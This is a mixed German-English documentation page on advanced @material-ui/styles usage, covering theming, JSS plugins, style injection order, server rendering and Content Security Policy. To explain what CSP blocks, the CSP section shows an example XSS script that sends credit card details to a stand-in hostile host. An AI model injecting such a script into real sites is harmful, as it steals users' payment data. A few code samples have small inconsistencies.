# Erweitert

<p class="description">Diese Sektion behandelt mehr der fortgeschrittenen Nutzung von @material-ui/styles.</p>

## Theming

Fügen Sie auf der oberste Ebene Ihrer App einen ` ThemeProvider` hinzu, um auf das Theme im Komponentenbaum von React zuzugreifen. Then, you can access the theme object in style functions.

```jsx
import { ThemeProvider } from '@material-ui/styles';

const theme = {
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
};

function Theming() {
  return (
    <ThemeProvider theme={theme}>
      <DeepChild />
    </ThemeProvider>
  );
}
```

{{"demo": "pages/css-in-js/advanced/Theming.js"}}

### Zugriff auf das Theme in einer Komponente

Möglicherweise müssen Sie auf die Themevariablen in Ihren React-Komponenten zugreifen.

#### `useTheme` hook

```jsx
import { useTheme } from '@material-ui/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}
```

{{"demo": "pages/css-in-js/advanced/UseTheme.js"}}

#### `withTheme` HOC

```jsx
import { withTheme } from '@material-ui/styles';

function DeepChildRaw(props) {
  return <span>{`spacing ${props.theme.spacing}`}</span>;
}

const DeepChild = withTheme(DeepChildRaw);
```

{{"demo": "pages/css-in-js/advanced/WithTheme.js"}}

### Verschachtelung des Themes

Sie können mehrere Theme Provider verschachteln. Dies kann sehr nützlich sein, wenn Sie sich mit unterschiedlichen Bereichen Ihrer Anwendung befassen, die sich voneinander unterscheiden.

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/css-in-js/advanced/ThemeNesting.js"}}

Das innere Theme ** überschreibt** das äußere Theme. Sie können das äußere Theme erweitern, indem Sie eine Funktion bereitstellen:

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## JSS-Plugins

JSS nutzt Plugins um seinen Kern zu erweitern, sodass Sie die Funktionen, die Sie benötigen auswählen können. Sie bezahlen nur für den Leistungsaufwand, den Sie verwenden.

Not all the plugins are available in Material-UI by default. The following (which is a subset of [jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-vendor-prefixer/)

Of course, you are free to use additional plugins. Hier ist ein Beispiel mit dem [ jss-rtl ](https://github.com/alitaheri/jss-rtl) Plugin.

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}

export default App;
```

## String-Vorlagen

If you prefer CSS syntax over JSS, you can use the [jss-plugin-template](https://cssinjs.org/jss-plugin-template) plugin.

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3px;
    font-size: 16px;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

Note that this doesn't support selectors, or nested rules.

{{"demo": "pages/css-in-js/advanced/StringTemplates.js"}}

## CSS-Injektionsreihenfolge

> Es ist **wirklich wichtig** um zu verstehen, wie die CSS-Spezifität vom Browser berechnet wird. Dies ist eines der Schlüsselelemente, die beim Überschreiben von Stilen zu beachten sind. Wir **ermutigen** Sie diesen MDN-Absatz: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated) zu lesen

Standardmäßig werden die Style-Tags **zuletzt** im `<head>` -Element der Seite eingefügt. Sie erhalten mehr Details als jedes andere Styletag auf Ihrer Seite, z.B. CSS-Module oder StilKomponenten.

### injectFirst

Der `StylesProvider` Komponente hat eine `injectFirst` Eigenschaft, um **zuerst** die Style-Tags im Kopf einzufügen (weniger Priorität):

```jsx
import { StylesProvider } from '@material-ui/styles';

<StylesProvider injectFirst>
  {/* Dein Komponentenbaum.
      Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben. */}
</StylesProvider>
```

### `makeStyles` / `withStyles` / `styled`

The injection of style tags happens in the **same order** as the `makeStyles` / `withStyles` / `styled` invocations. Zum Beispiel gewinnt die Farbe Rot in diesem Fall:

```jsx
import clsx from 'clsx';
import { makeStyles } from '@material-ui/styles';

const useStyleBase = makeStyles({
  root: {
    color: 'blue', // 🔵
  },
});

const useStyle = makeStyles({
  root: {
    color: 'red', // 🔴
  },
});

export default function MyComponent() {
  // Reihenfolge ist egal
  const classes = useStyles();
  const classesBase = useStyleBase();

  //  Reihenfolge ist egal
  const className = clsx(classes.root, useStyleBase.root)

  // Farbe: rot 🔴 gewinnt.
  return <div className={className} />;
}
```

The hook call order and the class name concatenation order **don't matter**.

### insertionPoint

JSS [provides a mechanism](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) to control this situation. By adding an `insertionPoint` within the HTML you can [control the order](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) that the CSS rules are applied to your components.

#### HTML-Kommentar

The simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:

```html
<head>
  <!-- jss-insertion-point -->
  <link href="...">
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### Andere HTML-Elemente

[Create React App](https://github.com/facebook/create-react-app) entfernt HTML-Kommentare beim Erstellen des Produktions-Builds. To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: document.getElementById('jss-insertion-point'),
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### JS createComment

codesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

## Server-Rendering

This example returns a string of HTML and inlines the critical CSS required, right before it’s used:

```jsx
import ReactDOMServer from 'react-dom/server';
import { ServerStyleSheets } from '@material-ui/styles';

function render() {
  const sheets = new ServerStyleSheets();

  const html = ReactDOMServer.renderToString(sheets.collect(<App />));
  const css = sheets.toString();

  return `
<!DOCTYPE html>
<html>
  <head>
    <style id="jss-server-side">${css}</style>
  </head>
  <body>
    <div id="root">${html}</div>
  </body>
</html>
  `;
}
```

You can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets`](/css-in-js/api/#serverstylesheets) API documentation.

### Gatsby

We have [an official plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Anleitungen zur Einrichtung und Verwendung finden Sie auf der Seite des Plugins.

Refer to [this example](https://github.com/mui-org/material-ui/blob/next/examples/gatsby-next/pages/_document.js) for an up-to-date usage example.

### Next.js

You need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/next/examples/nextjs-next/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.

Refer to [this example](https://github.com/mui-org/material-ui/blob/next/examples/nextjs-next/pages/_document.js) for an up-to-date usage example.

## Klassennamen

You may have noticed that the class names generated by `@material-ui/styles` are **non-deterministic**, so you can't rely on them to stay the same. The class names are generated by [the class name generator](/css-in-js/api/#creategenerateclassname-options-class-name-generator).

Let's take the following style as an example:

```jsx
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
}, {
  name: 'AppBar',
});
```

This will generate a class name such as `AppBar-root-123`. Das folgende CSS wird nicht funktionieren:

```css
.AppBar-root-123 {
  opacity: 0.6;
}
```

Sie müssen die `Klassen` Eigenschaft einer Komponente verwenden, um sie zu überschreiben. The non-deterministic nature of the class names enables optimization for development and production – they are easy to debug in development, and as short as possible in production:

- In der **Entwicklung** lauten der Klassenname: `.AppBar-root-123` nach dieser Logik:

```js
const sheetName = 'AppBar';
const ruleName = 'root';
const identifier = 123;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- In der **Produktion** lauten der Klassenname: `.jss123` nach dieser Logik:

```js
const productionPrefix = 'jss';
const identifier = 123;

const className = `${productionPrefix}-${identifier}`;
```

Wenn Sie dieses Standardverhalten nicht mögen, können Sie es ändern. JSS allows you to supply a [custom class name generator](https://cssinjs.org/jss-api/#generate-your-class-names).

## Globales CSS

### `jss-plugin-global`

The [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.

{{"demo": "pages/css-in-js/advanced/GlobalCss.js"}}

### Hybrid

Sie können auch JSS-generierte Klassennamen mit globalen Namen kombinieren.

{{"demo": "pages/css-in-js/advanced/HybridGlobalCss.js"}}

### Deterministische Klassennamen

Wir bieten eine Option, um die Klassennamen **deterministisch zu machen** mit der [`dangerouslyUseGlobalCS`](/css-in-js/api/#creategenerateclassname-options-class-name-generator) Option. Wenn diese Option aktiviert ist, sehen die Klassennamen folgendermaßen aus:

- entwicklung: `.AppBar-root`
- produktion: `.AppBar-root`

⚠️ **Seien Sie vorsichtig, wenn Sie `dangerouslyUseGlobalCSS `** verwenden. Das Verlassen auf diesen Code, der in der Produktion ausgeführt wird, hat folgende Auswirkungen:

- Es ist schwieriger, die `Klassen` API-Änderungen zwischen Hauptversionen zu verfolgen.
- Globales CSS ist von Natur aus fragil.

⚠️ Bei gefährlicher Verwendung von `dangerouslyUseGlobalCSS` als Standalone (ohne Material-UI) sollten Sie Ihre Stylesheets mit dem `options` Parameter versehen:

```jsx
// Hook
const useStyles = makeStyles(styles, { name: 'button' });

// Styled-components
const Button = styled(styles, { name: 'button' })(ButtonBase);

// Higher-order component
const Button = withStyles(styles, { name: 'button' })(ButtonBase);
```

## CSS-Präfix

JSS verwendet Featureerkennung, um die korrekten Präfixe anzuwenden. [Seien Sie nicht überrascht](https://github.com/mui-org/material-ui/issues/9293) wenn Sie in der neuesten Version von Chrome kein bestimmtes Präfix sehen können. Ihr Browser benötigt es wahrscheinlich nicht.

## Inhaltssicherheitsrichtlinie (Content Security Policy, CSP)

### Was ist CSP und warum ist es nützlich?

Grundsätzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zurückgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen für XSS anfälligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, könnte ein Angreifer Folgendes eingeben:

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>
    

Diese Sicherheitsanfälligkeit ermöglicht es dem Angreifer, irgendetwas auszuführen. Mit einem sicheren CSP-Header lädt der Browser dieses Skript jedoch nicht.

Weitere Informationen zu CSP finden Sie in den [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### Wie kann man CSP implementieren?

Um CSP mit Material-UI (und JSS) verwenden zu können, müssen Sie eine Nonce verwenden. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS hat ein [tolles Tutorial](https://github.com/cssinjs/jss/blob/next/docs/csp.md) wie man dies mit Express und React Helmet erreichen kann. Lesen Sie für einen grundlegenden Überblick weiter.

Eine CSP-Nonce ist eine Base 64-codierte Zeichenfolge. Sie können so erstellen:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

It is very important that you use UUID version 4, as it generates an **unpredictable** string. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header könnte mit der angewendeten Nonce so aussehen:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

Wenn Sie Server Side-Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers übergeben.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheets.toString() } }
/>
```

Dann müssen Sie dieses Nonce an JSS übergeben, damit es den nachfolgenden `<style>`-Tags hinzugefügt werden kann. Die Clientseite erhält die Nonce aus einem Header. Sie müssen diesen Header unabhängig davon angeben, ob SSR verwendet wird oder nicht.

```jsx
<meta property="csp-nonce" content={nonce} />
```